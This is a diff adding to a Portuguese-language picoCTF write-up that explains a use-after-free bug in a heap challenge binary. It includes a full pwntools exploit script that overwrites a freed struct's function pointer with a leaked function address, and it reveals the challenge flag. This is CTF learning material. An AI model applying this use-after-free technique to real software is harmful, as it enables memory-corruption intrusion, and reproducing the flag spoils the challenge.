@@ -352,6 +352,76 @@ typedef struct {
 Sendo assim, ao criar uma conta iremos colocar os dados de whatToDo e username no heap, ocupando 8 bytes.
 Entretanto, ao remover uma conta estaremos apenas indicando para o sistema que o espaço de 8 bytes anteriormente utilizado agora está livre para ser utilizado novamente, mantendo o ponteiro ainda apontando para aquele espaço de memória.
 
-Somado a isso, quando executamos a função de armazenamento de mensagem estamos realizando um malloc com tamanho de 8 bytes e a localização desse novo mapeamento no heap será na mesma posição dos dados do último free realizado (Ou seja, a mensagem será colocada na mesma posição que estavam os dados do struct, já que ambos possuem 8 bytes)
+Somado a isso, quando executamos a função de armazenamento de mensagem estamos realizando um malloc com tamanho de 8 bytes e a localização desse novo mapeamento no heap será na mesma posição dos dados do último free realizado (Ou seja, a mensagem será colocada na mesma posição que estavam os dados do struct, já que ambos possuem 8 bytes). Temos aqui então a falha **USE AFTER FREE**.
+
+O que vamos fazer é colocar nessa mensagem (Mais especificamente nos 4 primeiros bytes) o endereço da função ```hahaexploitgobrrr()``` para que, ao executar o ```doProcess(user)```, o ponteiro whatToDo agora aponte para a função hahaexploitgobrrr(), exibindo a flag no terminal.
+
+### Script em python para obter a flag passo a passo
+
+Passos:
+- Obter endereço da função hahaexploitgobrrr() pela opção "S" do menu
+- Criar conta do usuário
+- Deletar conta do usuário
+- Inserir mensagem contendo os 4 primeiros bytes com o endereço de hahaexploitgobrrr()
+
+
+Código:
+```python
+from pwn import context, log, p32, remote, sys
+
+context.binary = 'vuln'
+
+
+def get_process():
+    if len(sys.argv) == 1:
+        return context.binary.process()
+
+    host, port = sys.argv[1], sys.argv[2]
+    return remote(host, int(port))
+
+
+def main():
+    p = get_process()
+
+    # Pega o endereço da função hahaexploitgobrrr como inteiro
+    p.sendlineafter(b'(e)xit\n', b'S')
+    p.recvuntil(b'OOP! Memory leak...')
+    leak = int(p.recvline().decode().strip(), 16)
+
+    # Cria uma conta colocando um nome qualquer para o usuário
+    p.sendlineafter(b'(e)xit\n', b'M')
+    p.sendlineafter(b'Enter your username: \n', b'AAA')  
+
+    # Solicita remoção da conta
+    p.sendlineafter(b'(e)xit\n', b'I')
+    # Confirma remoção da conta
+    p.sendlineafter(b'(Y/N)?\n', b'Y')
+
+    # Grava uma mensagem
+    p.sendlineafter(b'(e)xit\n', b'L')
+    # A nossa mensagem vai ser nada mais do que o endereço da função hahaexploitgobrrr (4 bytes) no formato little endian.
+    p.sendlineafter(b'try anyways:\n', p32(leak))
+
+    # Após isso o programa remoto vai executar o doProcess(user) e rodar a função apontada pelo ponteiro whatToDo, que agora aponta para hahaexploitgobrrr, mostrando a flag no terminal
+    flag = p.recvline().decode().strip()
+
+    p.close()
+
+    log.success(f'Flag: {flag}')
+
+
+if __name__ == '__main__':
+    main()
+
+```
+Salvando o programa como solve.py e rodando ele com o comando ```python3 solve.py mercury.picoctf.net 4593```, obtemos a flag ```picoCTF{d0ubl3_j30p4rdy_ba307b82}``` no terminal:
+
+![flag-img](./FlagImg.png)
+
+### Agora sim o desafio foi concluído!
+
+
+
+
 
 
